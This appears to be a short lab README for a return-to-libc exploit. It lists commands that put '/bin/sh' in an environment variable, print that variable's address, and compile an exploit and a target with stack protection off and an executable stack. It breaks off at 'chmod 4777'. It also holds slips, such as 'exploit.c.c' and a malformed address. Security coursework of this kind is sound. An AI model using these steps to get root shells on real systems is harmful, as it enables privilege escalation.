# Running step


1. Set environment variable
```
$ source set-env.sh # (need type root password)
$ gcc -fno-stack-protector print-env.c -o print-env
$ print-env # MYSHELL address is 0xbfffffe8c command /bin/sh
```

2. Paste value into `exploit.c`

```
gcc -fno-stack-protector exploit.c.c -o exploit
gcc -z execstack -fno-stack-protector ret-libc-attack.c -o ret-libc-attack
chmod 4777 




